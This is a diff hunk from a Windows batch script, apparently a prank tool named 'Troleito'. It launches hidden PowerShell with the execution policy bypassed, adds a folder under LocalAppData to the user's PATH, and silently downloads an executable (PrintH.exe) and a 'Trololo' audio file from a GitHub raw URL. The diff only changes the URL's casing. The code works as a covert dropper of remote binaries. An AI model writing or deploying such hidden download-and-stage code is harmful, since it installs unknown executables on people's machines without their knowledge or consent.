@@ -8,7 +8,7 @@ if not exist "%LOCALAPPDATA%\TroleitoJaja\PrintH.exe" (
 powershell -m Hidden -ep Bypass -Command ^
 "$P = '$env:USERPROFILE\AppData\Local\TroleitoJaja'; ^
 [Environment]::SetEnvironmentVariable('PATH', $env:PATH + ';' + $P, [EnvironmentVariableTarget]::User); ^
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/PrintH.exe' -OutFile ($P + '\PrintH.exe'); ^
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/printh.exe' -OutFile ($P + '\PrintH.exe'); ^
 Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Lvsix14/Troleito/main/Tololo.wav' -OutFile ($P + '\Trololo.wav')"
 
 
